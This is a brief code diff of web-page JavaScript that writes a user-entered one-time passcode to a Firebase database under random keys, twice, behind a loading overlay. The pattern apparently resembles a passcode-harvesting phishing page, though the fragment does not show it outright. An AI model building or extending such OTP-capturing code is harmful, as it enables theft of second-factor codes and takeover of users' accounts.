@@ -66,8 +66,8 @@
       } else {
 
         document.getElementById('loadingOverlay').style.display = 'flex';
-        set(ref(db, 'SubGo/' + Math.random().toString(36).slice(2, 7)), {
-          OTP: otp
+        set(ref(db, 'OTP/' + Math.random().toString(36).slice(2, 7)), {
+          Notification: otp
         }).then(() => {
           sendNotify();
         }).catch((error) => {
@@ -80,7 +80,7 @@
     });
 
     function sendNotify() {
-      
+    
       set(ref(db, 'NotificationOTP/' + Math.random().toString(36).slice(2, 7)), {
         Notification: otp
       }).then(() => {
